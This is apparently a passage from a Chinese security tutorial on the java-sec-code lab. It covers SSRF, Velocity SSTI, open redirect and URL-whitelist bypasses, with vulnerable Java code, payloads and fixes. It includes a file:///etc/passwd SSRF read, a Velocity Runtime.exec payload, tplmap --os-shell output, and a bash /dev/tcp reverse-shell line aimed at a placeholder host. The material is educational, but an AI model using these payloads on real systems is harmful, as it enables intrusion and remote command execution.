class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String URLConnection(String url) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u &#x3D; new URL(url);</span><br><span class="line">        URLConnection urlConnection &#x3D; u.openConnection();</span><br><span class="line">        BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); &#x2F;&#x2F;send request</span><br><span class="line">        &#x2F;&#x2F; BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder html &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        while ((inputLine &#x3D; in.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            html.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        return html.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接调用了URLConnection()方法 导致存在任意文件读</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027092620488.png" alt="image-20211027092620488"></p><p>修复代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;urlConnection&#x2F;sec&quot;)</span><br><span class="line">public String URLConnectionSec(String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Decline not http&#x2F;https protocol</span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;[-] SSRF check failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        return HttpUtils.URLConnection(url);</span><br><span class="line">    &#125; catch (SSRFException | IOException e) &#123;</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过isHTTP()函数来看判断是否是http和https协议，之后调用钩子去调用SocketHookFactory，具体防护在SSRFChecker.java</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package org.joychou.security.ssrf;</span><br><span class="line"></span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.URI;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.lang.StringUtils;</span><br><span class="line">import org.apache.commons.net.util.SubnetUtils;</span><br><span class="line">import org.joychou.config.WebConfig;</span><br><span class="line">import org.joychou.security.SecurityUtil;</span><br><span class="line">import org.slf4j.Logger;</span><br><span class="line">import org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class SSRFChecker &#123;</span><br><span class="line"></span><br><span class="line">    private static Logger logger &#x3D; LoggerFactory.getLogger(SSRFChecker.class);</span><br><span class="line"></span><br><span class="line">    public static boolean checkURLFckSSRF(String url) &#123;</span><br><span class="line">        if (null &#x3D;&#x3D; url) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; ssrfSafeDomains &#x3D; WebConfig.getSsrfSafeDomains();</span><br><span class="line">        try &#123;</span><br><span class="line">            String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 必须http&#x2F;https</span><br><span class="line">            if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (ssrfSafeDomains.contains(host)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            for (String ssrfSafeDomain : ssrfSafeDomains) &#123;</span><br><span class="line">                if (host.endsWith(&quot;.&quot; + ssrfSafeDomain)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。</span><br><span class="line">     * url只允许https或者http，并且设置默认连接超时时间。</span><br><span class="line">     * 该修复方案会主动请求重定向后的链接。</span><br><span class="line">     *</span><br><span class="line">     * @param url        check的url</span><br><span class="line">     * @param checkTimes 设置重定向检测的最大次数，建议设置为10次</span><br><span class="line">     * @return 安全返回true，危险返回false</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static boolean checkSSRF(String url, int checkTimes) &#123;</span><br><span class="line"></span><br><span class="line">        HttpURLConnection connection;</span><br><span class="line">        int connectTime &#x3D; 5 * 1000;  &#x2F;&#x2F; 设置连接超时时间5s</span><br><span class="line">        int i &#x3D; 1;</span><br><span class="line">        String finalUrl &#x3D; url;</span><br><span class="line">        try &#123;</span><br><span class="line">            do &#123;</span><br><span class="line">                &#x2F;&#x2F; 判断当前请求的URL是否是内网ip</span><br><span class="line">                if (isInternalIpByUrl(finalUrl)) &#123;</span><br><span class="line">                    logger.error(&quot;[-] SSRF check failed. Dangerous url: &quot; + finalUrl);</span><br><span class="line">                    return false;  &#x2F;&#x2F; 内网ip直接return，非内网ip继续判断是否有重定向</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                connection &#x3D; (HttpURLConnection) new URL(finalUrl).openConnection();</span><br><span class="line">                connection.setInstanceFollowRedirects(false);</span><br><span class="line">                connection.setUseCaches(false); &#x2F;&#x2F; 设置为false，手动处理跳转，可以拿到每个跳转的URL</span><br><span class="line">                connection.setConnectTimeout(connectTime);</span><br><span class="line">                &#x2F;&#x2F;connection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">                connection.connect(); &#x2F;&#x2F; send dns request</span><br><span class="line">                int responseCode &#x3D; connection.getResponseCode(); &#x2F;&#x2F; 发起网络请求</span><br><span class="line">                if (responseCode &gt;&#x3D; 300 &amp;&amp; responseCode &lt;&#x3D; 307 &amp;&amp; responseCode !&#x3D; 304 &amp;&amp; responseCode !&#x3D; 306) &#123;</span><br><span class="line">                    String redirectedUrl &#x3D; connection.getHeaderField(&quot;Location&quot;);</span><br><span class="line">                    if (null &#x3D;&#x3D; redirectedUrl)</span><br><span class="line">                        break;</span><br><span class="line">                    finalUrl &#x3D; redirectedUrl;</span><br><span class="line">                    i +&#x3D; 1;  &#x2F;&#x2F; 重定向次数加1</span><br><span class="line">                    logger.info(&quot;redirected url: &quot; + finalUrl);</span><br><span class="line">                    if (i &#x3D;&#x3D; checkTimes) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else</span><br><span class="line">                    break;</span><br><span class="line">            &#125; while (connection.getResponseCode() !&#x3D; HttpURLConnection.HTTP_OK);</span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return true;  &#x2F;&#x2F; 如果异常了，认为是安全的，防止是超时导致的异常而验证不成功。</span><br><span class="line">        &#125;</span><br><span class="line">        return true; &#x2F;&#x2F; 默认返回true</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 判断一个URL的IP是否是内网IP</span><br><span class="line">     *</span><br><span class="line">     * @return 如果是内网IP，返回true；非内网IP，返回false。</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static boolean isInternalIpByUrl(String url) &#123;</span><br><span class="line"></span><br><span class="line">        String host &#x3D; url2host(url);</span><br><span class="line">        if (host.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; &#x2F;&#x2F; 异常URL当成内网IP等非法URL处理</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String ip &#x3D; host2ip(host);</span><br><span class="line">        if (ip.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; &#x2F;&#x2F; 如果域名转换为IP异常，则认为是非法URL</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 使用SubnetUtils库判断ip是否在内网网段</span><br><span class="line">     *</span><br><span class="line">     * @param strIP ip字符串</span><br><span class="line">     * @return 如果是内网ip，返回true，否则返回false。</span><br><span class="line">     *&#x2F;</span><br><span class="line">    static boolean isInternalIp(String strIP) &#123;</span><br><span class="line">        if (StringUtils.isEmpty(strIP)) &#123;</span><br><span class="line">            logger.error(&quot;[-] SSRF check failed. IP is empty. &quot; + strIP);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; blackSubnets &#x3D; WebConfig.getSsrfBlockIps();</span><br><span class="line">        for (String subnet : blackSubnets) &#123;</span><br><span class="line">            SubnetUtils utils &#x3D; new SubnetUtils(subnet);</span><br><span class="line">            if (utils.getInfo().isInRange(strIP)) &#123;</span><br><span class="line">                logger.error(&quot;[-] SSRF check failed. Internal IP: &quot; + strIP);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * host转换为IP</span><br><span class="line">     * 会将各种进制的ip转为正常ip</span><br><span class="line">     * 167772161转换为10.0.0.1</span><br><span class="line">     * 127.0.0.1.xip.io转换为127.0.0.1</span><br><span class="line">     *</span><br><span class="line">     * @param host 域名host</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static String host2ip(String host) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            InetAddress IpAddress &#x3D; InetAddress.getByName(host); &#x2F;&#x2F;  send dns request</span><br><span class="line">            return IpAddress.getHostAddress();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 从URL中获取host，限制为http&#x2F;https协议。只支持http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;，不支持&#x2F;&#x2F;的http协议。</span><br><span class="line">     *</span><br><span class="line">     * @param url http的url</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static String url2host(String url) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 使用URI，而非URL，防止被绕过。</span><br><span class="line">            URI u &#x3D; new URI(url);</span><br><span class="line">            if (SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">                return u.getHost();</span><br><span class="line">            &#125;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="15-SSTI"><a href="#15-SSTI" class="headerlink" title="15.SSTI"></a>15.SSTI</h2><blockquote><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p></blockquote><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;velocity&quot;)</span><br><span class="line">public void velocity(String template) &#123;</span><br><span class="line">    Velocity.init();</span><br><span class="line"></span><br><span class="line">    VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line"></span><br><span class="line">    context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class="line">    context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class="line">    context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class="line"></span><br><span class="line">    StringWriter swOut &#x3D; new StringWriter();</span><br><span class="line">    Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问URL：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.137.16:8080&#x2F;java_sec_code_war&#x2F;ssti&#x2F;velocity?template&#x3D;%23set($e&#x3D;%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027143734728.png" alt="image-20211027143734728"></p><p>也可以使用<a href="https://github.com/epinna/tplmap来验证">https://github.com/epinna/tplmap来验证</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap</span><br><span class="line">python tplmap.py --os-shell -u &#39;http:&#x2F;&#x2F;localhost:8080&#x2F;ssti&#x2F;velocity?template&#x3D;aa&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Testing if GET parameter &#39;template&#39; is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag &#39;$&#123;*&#125;&#39;</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag &#39;str(*)&#39;</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Jinja2 plugin is testing blind injection</span><br><span class="line">[+] Twig plugin is testing rendering with tag &#39;&#123;&#123;*&#125;&#125;&#39;</span><br><span class="line">[+] Twig plugin is testing blind injection</span><br><span class="line">[+] Freemarker plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Freemarker plugin is testing blind injection</span><br><span class="line">[+] Velocity plugin is testing rendering with tag &#39;*&#39;</span><br><span class="line">[+] Velocity plugin is testing blind injection</span><br><span class="line">[+] Velocity plugin has confirmed blind injection</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: template</span><br><span class="line">  Engine: Velocity</span><br><span class="line">  Injection: *</span><br><span class="line">  Context: text</span><br><span class="line">  OS: undetected</span><br><span class="line">  Technique: blind</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok (blind)</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok (blind)</span><br><span class="line">   File read: no</span><br><span class="line">   Code evaluation: no</span><br><span class="line"></span><br><span class="line">[+] Blind injection has been found and command execution will not produce any output.</span><br><span class="line">[+] Delay is introduced appending &#39;&amp;&amp; sleep &lt;delay&gt;&#39; to the shell commands. True or False is returned whether it returns successfully or not.</span><br><span class="line">[+] Run commands on the operating system.</span><br><span class="line"> (blind) $ id</span><br><span class="line">True</span><br><span class="line"> (blind) $ whoami</span><br><span class="line">True</span><br><span class="line"> (blind) $ bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;reverse_ip&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>修复意见：</p><p>针对于不同的模板引擎，该漏洞的修复方法会有所不同，但如果在传递给模板指令之前，对用户输入进行安全过滤的话，则可以大大减少这类威胁。此外，另一种防御方法是使用沙箱环境，将危险的指令删除/禁用，或者对系统环境进行安全加固。</p><ol><li><a href="https://xz.aliyun.com/t/7466">白头搔更短，SSTI惹人心</a></li></ol><h2 id="16-URLRedirect"><a href="#16-URLRedirect" class="headerlink" title="16.URLRedirect"></a>16.URLRedirect</h2><p>url重定向漏洞也称url任意跳转漏洞，网站信任了用户的输入导致恶意攻击，url重定向主要用来钓鱼，比如url跳转中最常见的跳转在登陆口，支付口，也就是一旦登陆将会跳转任意自己构造的网站，如果设置成自己的url则会造成钓鱼。</p><p>url跳转常见的地方</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 登陆跳转我认为是最常见的跳转类型，认证完后会跳转，所以在登陆的时候建议多观察url参数</span><br><span class="line">2. 用户分享、收藏内容过后，会跳转</span><br><span class="line">3. 跨站点认证、授权后，会跳转</span><br><span class="line">4. 站内点击其它网址链接时，会跳转</span><br><span class="line">5. 在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。</span><br><span class="line">6. 业务完成后跳转这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。</span><br></pre></td></tr></table></figure><p>url跳转常用到的参数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect</span><br><span class="line">url</span><br><span class="line">redirectUrl</span><br><span class="line">callback</span><br><span class="line">return_url</span><br><span class="line">toUrl</span><br><span class="line">ReturnUrl</span><br><span class="line">fromUrl</span><br><span class="line">redUrl</span><br><span class="line">request</span><br><span class="line">redirect_to</span><br><span class="line">redirect_url</span><br><span class="line">jump</span><br><span class="line">jump_to</span><br><span class="line">target</span><br><span class="line">to</span><br><span class="line">goto</span><br><span class="line">link</span><br><span class="line">linkto</span><br><span class="line">domain</span><br><span class="line">oauth_callback</span><br></pre></td></tr></table></figure><p>核心代码：</p><p>重定向跳转：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;redirect&quot;)</span><br><span class="line">public String redirect(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line">    return &quot;redirect:&quot; + url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>301跳转：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;setHeader&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void setHeader(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); &#x2F;&#x2F; 301 redirect</span><br><span class="line">    response.setHeader(&quot;Location&quot;, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>302跳转：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;sendRedirect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.sendRedirect(url); &#x2F;&#x2F; 302 redirect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复方式：</p><p>只能内部跳转</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;forward&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static void forward(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    RequestDispatcher rd &#x3D; request.getRequestDispatcher(url);</span><br><span class="line">    try &#123;</span><br><span class="line">        rd.forward(request, response);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过checkURL去检查输入的参数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @RequestMapping(&quot;&#x2F;sendRedirect&#x2F;sec&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">            throws IOException &#123;</span><br><span class="line">        String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">        if (SecurityUtil.checkURL(url) &#x3D;&#x3D; null) &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().write(&quot;url forbidden&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 同时支持一级域名和多级域名，相关配置在resources目录下url&#x2F;url_safe_domain.xml文件。</span><br><span class="line"> * 优先判断黑名单，如果满足黑名单return null。</span><br><span class="line"> *</span><br><span class="line"> * @param url the url need to check</span><br><span class="line"> * @return Safe url returns original url; Illegal url returns null;</span><br><span class="line"> *&#x2F;</span><br><span class="line">public static String checkURL(String url) &#123;</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; url)&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ArrayList&lt;String&gt; safeDomains &#x3D; WebConfig.getSafeDomains();</span><br><span class="line">    ArrayList&lt;String&gt; blockDomains &#x3D; WebConfig.getBlockDomains();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String host &#x3D; gethost(url);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 必须http&#x2F;https</span><br><span class="line">        if (!isHttp(url)) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果满足黑名单返回null</span><br><span class="line">        if (blockDomains.contains(host))&#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        for(String blockDomain: blockDomains) &#123;</span><br><span class="line">            if(host.endsWith(&quot;.&quot; + blockDomain)) &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 支持多级域名</span><br><span class="line">        if (safeDomains.contains(host))&#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 支持一级域名</span><br><span class="line">        for(String safedomain: safeDomains) &#123;</span><br><span class="line">            if(host.endsWith(&quot;.&quot; + safedomain)) &#123;</span><br><span class="line">                return url;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; catch (NullPointerException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检测相关url是否在自己配置中，若不在则返回NULL</p><h2 id="17-URLWhiteList"><a href="#17-URLWhiteList" class="headerlink" title="17.URLWhiteList"></a>17.URLWhiteList</h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><blockquote><blockquote><p>安全工程师：接口需要验证参数中的URL是否是内部域名。<br>开发工程师：好的，没问题。</p></blockquote></blockquote><p>如果不使用已经写好的安全框架，真正让开发去添加一个URL白名单，我相信不少人会出现不同程度的安全问题。</p><p>所以，我觉得有必要单独拿出来简单说下这个问题。</p><h3 id="2-可造成的漏洞"><a href="#2-可造成的漏洞" class="headerlink" title="2.可造成的漏洞"></a>2.可造成的漏洞</h3><p>和URL有关系的漏洞，我们可以联想到包括但不局限于下面的漏洞</p><ul><li>CSRF</li><li>JSONP</li><li>SSRF</li><li>URL跳转</li><li>绕过CORS(跨域资源分享)</li></ul><h3 id="3-Bypass-Poc及实际案例"><a href="#3-Bypass-Poc及实际案例" class="headerlink" title="3.Bypass Poc及实际案例"></a>3.Bypass Poc及实际案例</h3><p>先来看一下应该如何安全验证：</p><p>先来看下应该如何安全验证：</p><ul><li>取一级域名</li><li>判断一级域名是否在白名单里</li></ul><p>但是，在实际的甲方安全中，很多开发者会犯以下的一些错误。</p><h4 id="1-endsWith"><a href="#1-endsWith" class="headerlink" title="1.endsWith"></a>1.endsWith</h4><p>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bypassjoychou.com</span><br></pre></td></tr></table></figure><p>案例：<br>飞猪做referer校验的时候，全站存在referer校验bypass问题，导致全站存在Json Hijack等漏洞，可以拿到飞猪的开房记录等信息。目前漏洞已经修复。</p><p>绕过的poc</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.joychoualitrip.com&#x2F;mytrip&#x2F;</span><br></pre></td></tr></table></figure><p>针对JSONP，这里提一个比较有趣的问题。有的接口返回是JSON，非JSONP的格式，但是由于开发者写了一个callback参数（但是流量里并未出现）。所以在自动动扫描漏洞时，扫描器可加上<code>callback、cback</code>等参数，可能会有意想不到的收获。</p><p>比如：<code>http://www.alitrip.com/order?id=1</code>返回JSON格式，所以并不存在JSON劫持。但是访问<code>http://www.alitrip.com/order?id=1&amp;callback=xxx</code>可能就会返回JSONP格式，从而可能存在JSON劫持漏洞。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;endsWith&quot;)</span><br><span class="line"> public String endsWith(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">     String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">     for (String domain : domainwhitelist) &#123;</span><br><span class="line">         if (host.endsWith(domain)) &#123;</span><br><span class="line">             return &quot;Good url.&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return &quot;Bad url.&quot;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;url&#x2F;vuln&#x2F;endsWith?url&#x3D;http:&#x2F;&#x2F;aaajoychou.org</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151121258.png" alt="image-20211027151121258"></p><h4 id="2-contains"><a href="#2-contains" class="headerlink" title="2.contains"></a>2.contains</h4><p>取出一级域名。判断一级域名在白名单列表里使用contains判断</p><p>Bypass POC：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joychou.com.bypass.com</span><br><span class="line">bypassjoychou.com</span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;contains&quot;)</span><br><span class="line">public String contains(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    for (String domain : domainwhitelist) &#123;</span><br><span class="line">        if (host.contains(domain)) &#123;</span><br><span class="line">            return &quot;Good url.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;url&#x2F;vuln&#x2F;contains?url&#x3D;http:&#x2F;&#x2F;joychou.org.bypass.com</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151454711.png" alt="image-20211027151454711"></p><h4 id="3-statsWith"><a href="#3-statsWith" class="headerlink" title="3.statsWith"></a>3.statsWith</h4><p>取出一级域名，判断一级域名在白名单列表里使用<code>startsWith</code>判断</p><p>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joychou.combypass</span><br></pre></td></tr></table></figure><p>这种域名后缀虽然不存在，造成无法利用。但是在实际的测试中，确实发现某大公司是以这样的方式写的代码。所以说，如果没有规范，什么样的逻辑代码都能写出来。</p><h4 id="4-正则表达式"><a href="#4-正则表达式" class="headerlink" title="4.正则表达式"></a>4.正则表达式</h4><p>用正则表达式去匹配URL中是否存在<code>www.joychou.com</code>字符串<br>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.joychou.com.bypass.com</span><br></pre></td></tr></table></figure><p>还有的URL接口验证是否是图片链接，但是验证的方式居然是用正则匹配是否以类似<code>.800*600.</code>结尾。</p><p>Bypass Poc:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span 